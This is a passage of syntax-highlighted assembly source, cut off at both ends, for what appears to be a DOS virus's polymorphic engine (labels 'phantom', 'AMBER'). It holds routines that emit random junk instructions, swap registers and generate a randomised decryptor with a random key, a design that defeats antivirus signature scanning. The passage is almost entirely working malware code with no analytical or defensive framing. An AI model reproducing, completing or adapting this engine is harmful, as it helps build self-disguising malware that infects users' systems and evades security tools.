</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_used</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@again1</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_index</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">@again2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">m@1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">m@1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_used</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@again2</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;===================================== TRASH =============================</span><span class="sc0">
</span><span class="sc5">trash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._trash</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">; count of cmds</span><span class="sc0">


</span><span class="sc5">@circle</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">table_trash</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc5">bx.start_AMBER</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">        </span><span class="sc1">; number of trash functions</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; si - addres of [adress] procedure</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; procedure of trash</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@circle</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._trash</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt</span><span class="sc0">

</span><span class="sc5">table_trash</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trash1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trash2</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trash3</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trash4</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">trash5</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">  </span><span class="sc1">; change used registers</span><span class="sc0">

</span><span class="sc1">;11111111111111111111111111111111111111111111111111111111111111111111111</span><span class="sc0">

</span><span class="sc5">trash1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">cmd1</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">cmd1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">cmc</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">std</span><span class="sc0">

</span><span class="sc1">;22222222222222222222222222222222222222222222222222222222222222222222222</span><span class="sc0">

</span><span class="sc5">trash2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; add,or,adc,sbb,and,sub,xor,cmp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; r/m,r8 ; r/m, r16 ; r8,r/m  ; r16,r/m ;</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_gen</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; reg</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; r8|16,r/m</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nun</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">     </span><span class="sc1">; reg,reg</span><span class="sc0">

</span><span class="sc5">nun</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">      </span><span class="sc1">; r/m (r8|r16) , r8|r16</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; cl=0 - r/m, r8|r16     ; cl=1  -  r8/r16, r/m</span><span class="sc0">

</span><span class="sc5">xchang</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">xchang</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;333333333333333333333333333333333333333333333333333333333333333333333333</span><span class="sc0">
</span><span class="sc5">trash3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">cmd2mov</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                </span><span class="sc1">; mo in future</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_gen</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">cmd2mov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b0h</span><span class="sc0"> </span><span class="sc1">; - mov r8(al),xx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b4h</span><span class="sc0"> </span><span class="sc1">; - mov r8(ah),xx</span><span class="sc0">

</span><span class="sc1">;444444444444444444444444444444444444444444444444444444444444444444444</span><span class="sc0">
</span><span class="sc5">trash4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">cmd3mov</span><span class="sc4">-</span><span class="sc5">phantom</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_gen_</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_index</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_us_</span><span class="sc0">
</span><span class="sc5">_gen_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_gen</span><span class="sc0">
</span><span class="sc5">_us_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">cmd3mov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0"> </span><span class="sc1">; - mov r16(gen),xx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc0"> </span><span class="sc1">; - mov r16(index),xx</span><span class="sc0">

</span><span class="sc1">;555555555555555555555555555555555555555555555555555555555555555555555</span><span class="sc0">
</span><span class="sc5">trash5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.do</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">alas</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">bx.GenerReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">   </span><span class="sc1">; save old reg</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._trash</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Register must be reserved</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_gen</span><span class="sc0">       </span><span class="sc1">; get other reg</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx._trash</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Registers 4 trash</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.GenerReg</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; new</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; free the old reg</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0"> </span><span class="sc1">; xchg r16,r/m</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.rout</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">; not change</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">ok_mov</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.rout</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">   </span><span class="sc1">; to be or not to be ? :)))</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">ok_mov</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; if cl = 4 mov r16,r/m</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">; is new</span><span class="sc0">

</span><span class="sc1">; al - is old</span><span class="sc0">
</span><span class="sc1">; ah - is new</span><span class="sc0">


</span><span class="sc1">; may be xchg ?</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,[</span><span class="sc5">bx.rout</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">agazaza</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">agazaza</span><span class="sc0">
</span><span class="sc1">;------------------</span><span class="sc0">

</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">alas</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;--------------------------init decrypt code-----------------------------</span><span class="sc0">
</span><span class="sc1">;--------push---------</span><span class="sc0">
</span><span class="sc5">h_push1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0"> </span><span class="sc1">; push cs</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">                                              </span><span class="sc1">;))))</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0"> </span><span class="sc1">; pop ds</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">h_push2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc5">bx.UsedReg</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; set reg</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08ch</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">   </span><span class="sc1">; mov reg,cs</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.UsedReg</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">     </span><span class="sc1">; - unset reg</span><span class="sc0">
                                                </span><span class="sc1">;))))))</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc0">   </span><span class="sc1">; mov ds,reg</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0D8h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------- mov1--------</span><span class="sc0">
</span><span class="sc5">h_mov1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.e_mov1</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.CryptKod</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">trash</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------mov2--------</span><span class="sc0">
</span><span class="sc5">h_mov2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.e_mov2</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">              </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.do</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;---------xor---------</span><span class="sc0">
</span><span class="sc5">h_xor1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; add  ;</span><span class="sc0">
